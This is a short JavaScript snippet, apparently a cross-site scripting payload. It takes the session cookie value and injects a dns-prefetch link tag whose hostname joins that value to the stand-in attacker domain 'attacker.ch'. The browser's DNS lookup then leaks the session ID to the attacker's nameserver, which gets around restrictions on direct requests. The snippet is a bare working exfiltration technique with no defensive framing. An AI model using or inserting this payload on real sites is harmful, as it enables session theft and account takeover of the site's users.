var sessionid = document.cookie.split('=')[1]+"."; 
var body = document.getElementsByTagName('body')[0]; 
// injecting the link tag in the HTML body force the browser 
// to prefetch the given domain 
body.innerHTML = body.innerHTML + "<link rel=\"dns-prefetch\" href=\"//" + sessionid + "attacker.ch\">";